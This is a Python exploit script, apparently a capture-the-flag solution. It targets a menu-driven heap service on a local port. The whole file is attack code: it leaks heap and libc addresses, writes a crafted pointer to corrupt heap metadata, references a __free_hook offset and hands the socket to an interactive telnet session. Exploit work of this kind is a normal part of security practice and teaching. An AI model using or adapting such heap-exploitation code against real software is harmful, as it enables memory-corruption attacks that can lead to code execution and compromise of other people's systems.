import socket
import struct
import telnetlib
from hexdump import *

def recvu(s,string):
	r = ""
	while not r.endswith(string):
		tmp = s.recv(1)
		if not tmp : break
		r += tmp
	return r

s = socket.create_connection(['0',1234])
raw_input()
recvu(s,'bro?')
s.send("a"*39+'\n')
recvu(s,'name')
s.send("a"*39+'\n')
recvu(s,'Exit')
s.send('1\n')
recvu(s,'index')
s.send('1\n')
recvu(s,'size')
s.send(str(0x200)+'\n')
recvu(s,'Data')
s.send('A'*511+'\n')
recvu(s,'Exit')
s.send('5\n')
s.send('1\n')
recvu(s,'Exit')
s.send('2\n')
recvu(s,'index')
s.send('1\n')
#print hexdump(recvu(s,'1'))
heap1 = struct.unpack('<Q',recvu(s,'1')[-8:-2]+"\x00\x00")[0] - 0x410
s.send('1\n')
recvu(s,'index')
s.send('0\n')
recvu(s,'size')
s.send('100\n')
recvu(s,'Data')
print hex(heap1+0x80)
s.send(struct.pack('<Q',heap1+0x80-0x78))
free_hook = 0x3C57A8
recvu(s,'Exit')
s.send('2\n')
recvu(s,'index')
s.send('0\n')
libc = struct.unpack('<Q',recvu(s,'1')[-8:-2]+"\x00\x00")[0] - 0x3c3d0a-0x6e
print hex(libc)
t = telnetlib.Telnet()
t.sock = s
t.interact()
